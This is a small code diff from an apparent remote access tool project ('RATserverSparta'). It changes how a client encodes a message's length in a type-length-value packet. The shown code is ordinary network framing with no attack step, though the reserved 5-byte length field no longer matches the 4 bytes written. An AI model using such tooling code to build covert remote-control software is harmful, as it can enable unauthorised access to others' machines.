@@ -21,7 +21,7 @@ namespace RATserverSparta.Client
                 try
                 {
                     byte[] type = new byte[] { messageType };
-                    byte[] mesLength = Encoding.ASCII.GetBytes(message.Length.ToString());
+                    byte[] mesLength = BitConverter.GetBytes(message.Length);
                     byte[] tlv = new byte[1 + 5 + message.Length];
 
                     Array.Copy(type, 0, tlv, 0, 1);
